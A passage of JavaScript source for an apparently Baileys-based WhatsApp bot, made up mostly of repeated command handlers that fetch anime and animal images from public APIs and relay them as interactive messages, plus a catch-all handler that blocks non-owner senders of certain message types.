              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebonk':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebully':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeyeet':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebite':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animelick':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekill':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecry':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewlp':{
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekiss':{
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehug':{
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeneko':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepat':{
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeslap':{
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecuddle':{
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewaifu':{
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animenom':{
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefoxgirl':{
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case '':  // This will catch all messages
    if (m.message) {
        // Check if the message mimetype matches any of the specified types
        if (m.mtype === "liveLocationMessage" || 
            m.mtype === "scheduledCallCreationMessage" || 
            m.mtype === "orderMessage" || 
            m.mtype === "documentMessage" ||
            m.mtype === "viewOnceMessageV2" || 
            m.mtype === "paymentInviteMessage") {

            // Only proceed if the sender is NOT the owner (AlyaTheQueen)
            if (!AlyaTheQueen) {
                // Send a long message if any of the specified mimetypes were sent
                m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n');

                // Block the sender if they're not the owner
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                await AlyaBotInc.updateBlockStatus(users, 'block');
                await replygcalya(`Done`);
            } else {
                // If the owner (AlyaTheQueen) sends the message, don't block them
                await replygcalya(`Owner cannot be blocked`);
            }
        }
    }
    break;
case 'animetickle': {
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animegecg': {
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'dogwoof': {
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case '8ballpool': {
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
